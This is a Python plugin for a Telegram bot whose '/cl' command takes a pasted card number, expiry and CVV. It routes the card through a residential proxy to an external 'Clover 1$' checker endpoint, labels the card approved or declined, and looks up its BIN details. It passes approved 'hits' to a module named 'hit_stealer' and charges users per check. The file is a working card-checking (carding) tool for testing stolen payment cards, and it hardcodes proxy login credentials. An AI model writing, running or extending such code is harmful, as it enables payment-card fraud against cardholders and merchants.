from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
import httpx, re, time
from plugins.func.users_sql import fetchinfo, updatedata, plan_expirychk
from plugins.tools.hit_stealer import send_hit_if_approved

@Client.on_message(filters.command("cl", prefixes=["/", "."]), group=93)
async def cmd_clover(client, message):
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        chat_type = message.chat.type
        username = message.from_user.username or "None"

        regdata = fetchinfo(user_id)
        if not regdata:
            return await message.reply("❌ You are not registered. Use /register first.")

        role = (regdata[2] or "FREE").upper()
        credit = int(regdata[5] or 0)
        wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
        antispam_time = int(regdata[7] or 0)
        now = int(time.time())

        if chat_type == ChatType.PRIVATE and role == "FREE":
            return await message.reply(
                "⚠️ <b>Premium Users Required</b>\nOnly Premium users can use this command in bot PM.\nJoin our group to use it for FREE:",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
                ]),
                disable_web_page_preview=True
            )

        with open("plugins/group.txt") as f:
            GROUP = f.read().splitlines()
        if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in GROUP:
            return await message.reply("❌ Unauthorized group. Contact admin.")

        if credit < 1:
            return await message.reply("❌ Insufficient credit.")
        if now - antispam_time < wait_time:
            return await message.reply(f"⏳ Wait {wait_time - (now - antispam_time)}s")

        cc_text = message.reply_to_message.text if message.reply_to_message else (
            message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None
        )
        if not cc_text:
            return await message.reply("❌ Usage: /cl <cc|mm|yy|cvv>")

        match = re.search(r"(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})", cc_text)
        if not match:
            return await message.reply("❌ Invalid format. Use: xxxx xxxx xxxx xxxx|MM|YY|CVV")

        ccnum, mes, ano, cvv = match.groups()
        fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"

        check_msg = await message.reply(f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Clover 1$</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> Checking...
<b>⊙ Response:</b> Waiting...
""")

        tic = time.perf_counter()

        # Setup async proxy request
        try:
            async with httpx.AsyncClient(timeout=50) as clientx:
                proxy_string = "proxy.rampageproxies.com:5000:package-1111111-country-us-city-bloomington-region-indiana:5671nuWwEPrHCw2t"
                url = f"http://luckyxd.biz:1111/clv?cc={fullcc}&proxy={proxy_string}"
                res = await clientx.get(url)
                try:
                    data = res.json()
                    card_message = data.get("message") or data.get("result") or res.text or "❌ No response message."
                except:
                    card_message = res.text
        except Exception as e:
            card_message = f"❌ Request failed: {str(e)}"

        # BIN Lookup with proxy (async)
        try:
            headers = {"User-Agent": "Mozilla/5.0"}
            bin_proxy = "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
            transport = httpx.AsyncHTTPTransport(proxy=bin_proxy)
            async with httpx.AsyncClient(transport=transport, timeout=15) as bclient:
                bres = await bclient.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}", headers=headers)
                b = bres.json()
                brand = str(b.get("brand") or b.get("scheme") or "N/A").upper()
                type_ = str(b.get("type", "N/A")).upper()
                level = str(b.get("level", "N/A")).upper()
                bank = str(b.get("bank", "N/A")).upper()
                country = str(b.get("country_name", "N/A")).upper()
                flag = b.get("country_flag", "🏳️")
        except Exception as e:
            print("[BIN ERROR]", e)
            brand = type_ = level = bank = country = "N/A"
            flag = "🏳️"

        toc = time.perf_counter()
        status = "Approved ✅" if any(x in card_message.lower() for x in ["charged", "live", "approved", "cvv", "avs", "postal", "zip"]) else "Declined ❌"

        final_msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Clover 1$</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bank}
<b>⊚ BIN Info:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""

        try:
            if check_msg.text != final_msg:
                await check_msg.edit_text(final_msg)
        except Exception as e:
            if "MESSAGE_NOT_MODIFIED" not in str(e):
                await message.reply(f"❌ Error: {str(e)}")

        if "approved" in status.lower() or "live" in card_message.lower():
            await send_hit_if_approved(client, final_msg)

        updatedata(user_id, "credits", credit - 1)
        updatedata(user_id, "antispam_time", now)
        plan_expirychk(user_id)

    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")
